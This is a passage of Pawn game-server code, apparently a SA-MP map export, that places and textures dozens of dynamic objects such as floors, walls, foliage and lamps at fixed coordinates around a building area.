	tmpobjid = CreateDynamicObject(19378,-2637.156,3.638,7.979,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2637.080,5.448,7.977,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(18981,-2643.156,-59.966,-4.425,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2626.052,-59.942,-4.427,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2614.002,-47.866,-4.429,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2614.024,-22.954,-4.429,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2613.973,2.004,-4.429,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2613.962,17.025,-4.431,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2626.025,29.037,-4.433,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2643.007,29.033,-4.431,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(19380,-2644.996,15.142,3.149,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2644.996,23.809,3.147,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2640.266,10.317,3.149,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2630.652,10.308,3.149,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2625.778,15.005,3.149,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2625.778,23.723,3.147,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2630.522,28.555,3.149,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19380,-2640.139,28.573,3.149,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2633.964,15.095,3.131,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2640.128,21.565,3.131,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2636.035,19.009,3.131,0.000,0.000,41.016,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(18766,-2631.531,15.360,7.889,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "crazypave", 0);
	tmpobjid = CreateDynamicObject(18766,-2639.937,24.143,7.889,90.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "crazypave", 0);
	tmpobjid = CreateDynamicObject(18766,-2634.610,24.183,7.889,90.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "crazypave", 0);
	tmpobjid = CreateDynamicObject(18766,-2631.499,21.712,7.891,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "crazypave", 0);
	tmpobjid = CreateDynamicObject(18766,-2634.781,21.287,7.887,90.000,0.000,311.147,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 9920, "anotherbuildsfe", "grassgrn256", 0);
	tmpobjid = CreateDynamicObject(19377,-2629.086,15.068,3.131,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2629.058,21.869,3.131,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2633.826,26.648,3.131,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(19377,-2640.184,26.654,3.131,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 3603, "bevmans01_la", "cemebuild03_law", 0);
	tmpobjid = CreateDynamicObject(744,-2646.770,-47.313,5.727,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2638.546,-44.192,4.157,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2648.141,-44.153,4.157,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2652.916,-48.885,4.157,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2652.871,-53.317,4.157,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2648.092,-58.083,4.157,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2638.489,-58.090,4.157,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2633.691,-53.313,4.157,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2633.672,-48.957,4.155,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19378,-2647.679,-36.495,7.977,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19378,-2640.076,-36.391,7.975,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "ws_floortiles2", 0);
	tmpobjid = CreateDynamicObject(19377,-2650.717,-30.024,2.804,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 4552, "ammu_lan2", "sl_lavicdtwall1", 0);
	tmpobjid = CreateDynamicObject(19377,-2643.810,-27.693,3.497,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2643.778,-33.934,3.495,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2643.939,-3.531,3.497,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(19377,-2643.961,2.799,3.495,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 13691, "bevcunto2_lahills", "adeta", 0);
	tmpobjid = CreateDynamicObject(18981,-2677.522,-59.977,-8.447,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2684.283,-59.970,-8.449,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2696.272,-46.996,-8.449,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2696.511,17.031,-8.449,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2683.582,29.054,-8.449,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18981,-2677.566,29.065,-8.451,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	tmpobjid = CreateDynamicObject(18766,-2696.215,-14.497,3.726,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 10765, "airportgnd_sfse", "ws_whitestripe", 0);
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	tmpobjid = CreateDynamicObject(19381,-2660.235,15.504,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2660.189,24.215,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2660.301,-46.324,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2660.237,-55.192,5.073,-12.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.673,-39.139,4.767,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.680,-35.235,4.767,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.701,-32.095,4.765,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.665,0.790,4.765,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.677,4.719,4.765,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(14407,-2654.707,8.185,4.763,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8437,-2628.384,-15.592,13.516,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8437,-2622.967,-4.950,13.000,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8437,-2623.041,-26.509,13.006,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.715,-5.972,8.032,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.794,3.632,8.032,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.703,5.412,8.030,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.469,-25.294,8.032,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.472,-34.792,8.032,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.462,-37.696,8.030,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2650.265,15.023,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2650.240,24.533,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2618.900,23.869,8.030,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2618.904,15.856,8.000,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2650.385,-45.912,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2650.391,-55.535,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2619.477,-54.784,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2619.469,-45.170,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.875,-47.235,7.970,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2639.909,-46.021,7.988,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2629.935,-54.626,7.968,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2640.292,-54.728,7.968,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8661,-2633.779,19.187,6.523,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2620.480,23.856,8.028,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(19381,-2620.486,14.268,8.028,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2637.156,17.376,7.291,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2637.173,21.382,7.289,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2636.579,21.416,7.293,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2649.682,-8.419,5.348,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(619,-2649.822,19.337,5.934,0.000,0.000,40.184,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(703,-2624.314,-53.554,7.421,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2638.409,-53.365,7.056,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2641.712,-52.699,4.854,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2645.736,-52.673,6.011,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2641.063,-55.775,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2645.160,-55.063,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2648.433,-52.735,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2647.848,-54.897,5.505,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2636.768,-54.658,5.505,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2650.432,-52.567,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2650.607,-55.137,4.865,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2649.985,-48.923,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2642.822,-47.458,5.186,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2644.420,-49.890,5.186,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2639.286,-50.717,5.186,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2636.835,-52.709,5.186,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2636.185,-50.305,4.357,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2636.307,-47.404,4.357,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2639.547,-47.486,4.357,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(620,-2637.689,-50.881,0.425,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(620,-2647.291,-45.745,-0.659,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(620,-2648.907,-52.643,-2.479,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(620,-2642.381,-53.044,5.463,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(620,-2637.314,-46.359,-3.630,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2650.261,-47.214,4.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2636.775,-45.537,7.860,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2644.221,-49.980,8.068,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2649.746,-46.059,7.662,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2648.448,-53.082,8.998,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2641.030,-54.682,8.068,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2638.050,-55.585,5.505,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2635.593,-53.076,8.068,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(9833,-2640.671,-50.663,7.945,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(9833,-2648.155,-49.779,7.945,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2636.826,16.906,7.295,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(10444,-2649.732,-22.832,5.348,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(9833,-2657.074,-27.566,3.033,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(9833,-2657.188,-15.771,3.033,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(9833,-2657.310,-2.893,3.033,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(823,-2658.413,20.889,4.774,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(823,-2659.419,-50.259,4.774,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2658.926,17.246,5.665,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2661.201,19.222,5.665,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2660.224,22.569,5.665,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2657.597,23.026,5.905,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2656.660,20.518,5.905,0.000,-12.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2659.520,12.889,4.808,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2659.195,26.762,4.808,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(639,-2655.555,26.470,6.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(639,-2655.561,13.240,6.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.839,13.669,6.001,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.782,17.615,6.001,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.135,13.949,4.906,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.193,16.809,4.906,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.156,25.959,4.906,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.371,22.427,4.906,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.353,26.501,5.851,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.516,23.191,5.851,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2659.990,-43.822,4.808,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2660.143,-57.864,4.808,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2660.484,-48.181,5.154,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2660.830,-50.488,5.154,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2660.207,-52.837,5.154,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2658.294,-53.485,5.664,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2656.217,-52.187,5.979,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2659.366,-47.543,5.459,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2657.186,-48.044,6.070,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(869,-2656.491,-50.325,6.070,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.247,-43.972,5.006,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.326,-47.968,5.006,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.561,-53.895,5.006,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2662.429,-57.283,5.006,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2657.028,-43.867,6.026,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2657.024,-47.188,6.041,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.850,-55.081,6.026,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3532,-2656.869,-57.681,6.026,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(639,-2655.698,-44.304,6.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(639,-2655.672,-57.277,6.086,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.478,-28.686,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-25.948,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-23.143,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-20.338,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-17.533,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-13.793,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-10.988,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-8.183,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.487,-5.378,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.478,-2.590,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2654.137,-0.221,8.064,90.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2654.113,-29.052,8.064,90.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.641,-42.523,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.641,-45.328,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.641,-48.133,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
